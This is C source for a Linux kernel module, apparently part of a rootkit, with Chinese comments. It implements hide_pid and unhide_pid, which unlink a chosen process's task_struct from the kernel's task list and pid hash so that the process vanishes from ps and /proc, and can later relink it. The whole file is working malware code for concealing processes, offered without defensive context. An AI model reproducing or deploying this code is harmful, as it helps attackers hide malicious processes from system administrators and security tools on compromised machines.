#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/pid.h>
#include <linux/sched.h>
# include <linux/init_task.h>
# include <linux/fs.h>

#include "util.h"
#include "hide_pid.h"

// #define SECRET_PROC 1

//找到指定pid结构体指针
//通过pid结构体对应PIDTYPE_PID找到全局进程链表存储结构体task_struct
//找到对应表节点
//执行rcu删除操作
//安全指针


static LIST_HEAD(hidden_pid_list_head); //初始化链表头

/* private structure */
struct pid_node
{
    pid_t pid_num;
    struct task_struct *task;
    struct list_head list;
};


void hide_pid_exit(void)
{
    struct pid_node *entry = NULL, *next_entry = NULL;

    list_for_each_entry_safe(entry, next_entry, &hidden_pid_list_head, list)
    {
        list_del(&entry->list);
        kfree(entry);
    }
}

void hide_pid(pid_t pid_num)
{
    struct pid_node *mynode = NULL;
    struct task_struct *task; 
    struct hlist_node *node;
    struct pid *pid;
    pid = find_vpid(pid_num);
    if (IS_ERR(pid))
    {
        fm_alert("Failed to hide process:%d with error %ld.\n",
                 pid_num, PTR_ERR(pid));
    }
    else
    {
        task = pid_task(pid, PIDTYPE_PID);
        node = &task->pid_links[PIDTYPE_PID];
        list_del_rcu(&task->tasks);
        fm_alert("break process linked_list");
        INIT_LIST_HEAD(&task->tasks);
        hlist_del_rcu(node);
        INIT_HLIST_NODE(node);
        node->pprev = &node;

        fm_alert("Succeeded in hide process: %d\n", pid_num);
        mynode = kmalloc(sizeof(struct pid_node), GFP_KERNEL);
        mynode->task = task;
        mynode->pid_num = pid_num;
        list_add_tail(&mynode->list, &hidden_pid_list_head);
        fm_alert("Succeeded in hide process: %d\n", pid_num);
    }
}


//执行rcu恢复node与tasklist表
void unhide_pid(pid_t pid_num)
{
    struct pid_node *entry = NULL, *next_entry = NULL;
    struct hlist_node *node;
    struct task_struct *task; 

    fm_alert("Succeeded in reappear process: %d\n", pid_num);

    list_for_each_entry(entry, &hidden_pid_list_head, list)
    {
        if (entry->pid_num == pid_num)
        {
            task = entry->task;
            node = &task->pid_links[PIDTYPE_PID];
            hlist_add_head_rcu(node, &task->thread_pid->tasks[PIDTYPE_PID]);
            list_add_tail_rcu(&task->tasks, &init_task.tasks);
            fm_info("Unhiding: %d", pid_num);
        }
    }

    list_for_each_entry_safe(entry, next_entry, &hidden_pid_list_head, list)
    {
        if (entry->pid_num == pid_num)
        {
            list_del(&entry->list);
            kfree(entry);
        }
    }
}